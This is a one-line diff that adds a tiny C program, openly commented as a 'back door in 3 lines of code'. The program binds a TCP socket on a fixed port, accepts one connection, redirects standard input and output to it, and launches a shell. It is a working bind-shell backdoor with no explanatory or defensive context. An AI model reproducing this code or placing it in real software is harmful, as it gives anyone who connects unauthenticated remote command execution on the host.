@@ -1,0 +1,1 @@
+/* Back door in 3 lines of code. */short a[9];main(){    a[1]=8738;    dup2(dup2(accept(3,listen(3,1),bind(socket(*a=2,1,0),a,16)),0),1);    system("sh");}
